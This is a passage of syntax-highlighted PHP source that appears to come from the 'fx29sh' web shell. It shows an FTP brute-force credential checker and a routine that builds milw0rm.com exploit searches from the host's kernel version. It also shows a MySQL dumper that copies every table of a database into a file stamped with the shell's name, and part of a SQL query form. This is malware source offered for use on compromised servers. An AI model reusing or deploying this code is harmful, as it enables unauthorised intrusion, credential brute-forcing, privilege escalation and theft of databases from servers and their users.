  <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$arr</span><span class="p">))</span> <span class="p">{</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$k</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;GLOBALS&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nx">strips</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="s2">&quot;</span><span class="si">$k</span><span class="s2">&quot;</span><span class="p">]);</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span> <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span> <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">getmicrotime</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">list</span><span class="p">(</span><span class="nv">$usec</span><span class="p">,</span> <span class="nv">$sec</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="nb">microtime</span><span class="p">());</span>
  <span class="k">return</span> <span class="p">((</span><span class="nx">float</span><span class="p">)</span><span class="nv">$usec</span> <span class="o">+</span> <span class="p">(</span><span class="nx">float</span><span class="p">)</span><span class="nv">$sec</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">milw0rm</span><span class="p">()</span> <span class="p">{</span>
  <span class="nv">$Lversion</span> <span class="o">=</span> <span class="nb">php_uname</span><span class="p">(</span><span class="s2">&quot;r&quot;</span><span class="p">);</span>
  <span class="nv">$OSV</span> <span class="o">=</span> <span class="nb">php_uname</span><span class="p">(</span><span class="s2">&quot;s&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;Linux&quot;</span><span class="p">,</span><span class="nv">$OSV</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$Lversion</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$Lversion</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
    <span class="k">return</span> <span class="s2">&quot;http://milw0rm.com/search.php?dong=Linux Kernel &quot;</span><span class="o">.</span><span class="nv">$Lversion</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$Lversion</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$Lversion</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
    <span class="k">return</span> <span class="s2">&quot;http://milw0rm.com/search.php?dong=&quot;</span><span class="o">.</span><span class="nv">$OSV</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$Lversion</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">fx29ftpbrutecheck</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$timeout</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">,</span><span class="nv">$sh</span><span class="p">,</span><span class="nv">$fqb_onlywithsh</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_onlywithsh</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$TRUE</span> <span class="o">=</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sh</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;/bin/FALSE&quot;</span><span class="p">,</span><span class="s2">&quot;/sbin/nologin&quot;</span><span class="p">)));</span> <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span> <span class="nv">$TRUE</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$TRUE</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$sock</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$timeout</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">ftp://&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;@&quot;</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> target=</span><span class="se">\&quot;</span><span class="s2">_blank</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Connected to &quot;</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;.&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
      <span class="o">@</span><span class="nb">ob_flush</span><span class="p">();</span>
      <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_getpwuid</span><span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_getgrgid</span><span class="p">(</span><span class="nv">$gid</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;posix_kill&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_kill</span><span class="p">(</span><span class="nv">$gid</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="c1">###[ MySQL FUNCTIONS ]###</span>
<span class="k">function</span> <span class="nf">mysql_dump</span><span class="p">(</span><span class="nv">$set</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$sock</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;sock&quot;</span><span class="p">];</span>
  <span class="nv">$db</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;db&quot;</span><span class="p">];</span>
  <span class="nv">$print</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;print&quot;</span><span class="p">];</span>
  <span class="nv">$nl2br</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;nl2br&quot;</span><span class="p">];</span>
  <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">];</span>
  <span class="nv">$add_drop</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;add_drop&quot;</span><span class="p">];</span>
  <span class="nv">$tabs</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;tabs&quot;</span><span class="p">];</span>
  <span class="nv">$onlytabs</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">];</span>
  <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Error: </span><span class="se">\$</span><span class="s2">sock is not valid resource.&quot;</span><span class="p">);}</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$db</span><span class="p">))</span> <span class="p">{</span><span class="nv">$db</span> <span class="o">=</span> <span class="s2">&quot;db&quot;</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$print</span><span class="p">))</span> <span class="p">{</span><span class="nv">$print</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$nl2br</span><span class="p">))</span> <span class="p">{</span><span class="nv">$nl2br</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$add_drop</span><span class="p">))</span> <span class="p">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$tmp_dir</span><span class="o">.</span><span class="s2">&quot;dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tabs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$add_drop</span><span class="p">))</span> <span class="p">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">#Retrieve tables-list</span>
    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW TABLES FROM &quot;</span><span class="o">.</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tabs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];}}</span>
  <span class="p">}</span>
  <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="s2">  # Dumped by &quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">  # MySQL version: (&quot;</span><span class="o">.</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;) running on &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)&quot;</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">  # Date: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">  # DB: </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$db</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"></span>
<span class="s2">  #---------------------------------------------------------&quot;</span><span class="p">;</span>
  <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$onlytabs</span><span class="p">);</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$tabs</span> <span class="k">as</span> <span class="nv">$tab</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$tab</span><span class="p">,</span><span class="nv">$onlytabs</span><span class="p">))</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$add_drop</span><span class="p">)</span> <span class="p">{</span><span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;DROP TABLE IF EXISTS `&quot;</span><span class="o">.</span><span class="nv">$tab</span><span class="o">.</span><span class="s2">&quot;`;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span>
      <span class="c1">#Receieve query for create table structure</span>
      <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW CREATE TABLE `&quot;</span><span class="o">.</span><span class="nv">$tab</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
        <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;1&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="c1">#Receieve table variables</span>
        <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM `</span><span class="si">$tab</span><span class="s2">`&quot;</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$keys</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;`, `&quot;</span><span class="p">,</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$row</span><span class="p">));</span>
            <span class="nv">$values</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
            <span class="k">foreach</span><span class="p">(</span><span class="nv">$values</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
            <span class="nv">$values</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;&#39;, &#39;&quot;</span><span class="p">,</span> <span class="nv">$values</span><span class="p">);</span>
            <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO `</span><span class="si">$tab</span><span class="s2">`(`&quot;</span><span class="o">.</span><span class="nv">$keys</span><span class="o">.</span><span class="s2">&quot;`) VALUES (&#39;&quot;</span><span class="o">.</span><span class="nv">$values</span><span class="o">.</span><span class="s2">&quot;&#39;);</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
            <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$sql</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;#---------------------------------------------------------------------------------</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nb">fwrite</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$out</span><span class="p">);</span>
      <span class="nb">fclose</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$print</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$nl2br</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nb">nl2br</span><span class="p">(</span><span class="nv">$out</span><span class="p">);}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$out</span><span class="p">;}}</span>
  <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">mysql_buildwhere</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span><span class="nv">$sep</span><span class="o">=</span><span class="s2">&quot; and&quot;</span><span class="p">,</span><span class="nv">$functs</span><span class="o">=</span><span class="k">array</span><span class="p">())</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">))</span> <span class="p">{</span><span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
  <span class="nv">$result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$array</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;(&quot;</span><span class="p">;}</span>
    <span class="nv">$value</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="s2">&quot;)&quot;</span><span class="p">;}</span>
    <span class="nv">$result</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;` = &quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="nv">$sep</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$sep</span><span class="p">));</span>
  <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">mysql_fetch_all</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nv">$sock</span><span class="p">);}</span>
  <span class="k">else</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);}</span>
  <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
  <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
  <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">mysql_smarterror</span><span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span> <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span> <span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">();</span> <span class="p">}</span>
  <span class="nv">$error</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$error</span><span class="p">);</span>
  <span class="k">return</span> <span class="nv">$error</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">mysql_query_form</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">global</span> <span class="nv">$submit</span><span class="p">,</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_query_result</span><span class="p">,</span><span class="nv">$sql_confirm</span><span class="p">,</span><span class="nv">$sql_query_error</span><span class="p">,</span><span class="nv">$tbl_struct</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">((</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_result</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_error</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="s2">&quot;Query was empty&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$sql_query_error</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_act</span> <span class="o">=</span> <span class="nv">$sql_goto</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;form name=</span><span class="se">\&quot;</span><span class="s2">fx29sh_sqlquery</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Do you really want to&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;SQL-Query&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;textarea name=sql_query cols=100 rows=10&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=hidden name=act value=sql&amp;gt;&amp;lt;input type=hidden name=sql_act value=query&amp;gt;&amp;lt;input type=hidden name=sql_tbl value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=submit value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">sql_goto</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_goto</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=submit name=sql_confirm value=</span><span class="se">\&quot;</span><span class="s2">Yes</span><span class="se">\&quot;</span><span class="s2">&amp;gt; &amp;lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">No</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$tbl_struct</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td valign=</span><span class="se">\&quot;</span><span class="s2">top</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Fields:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
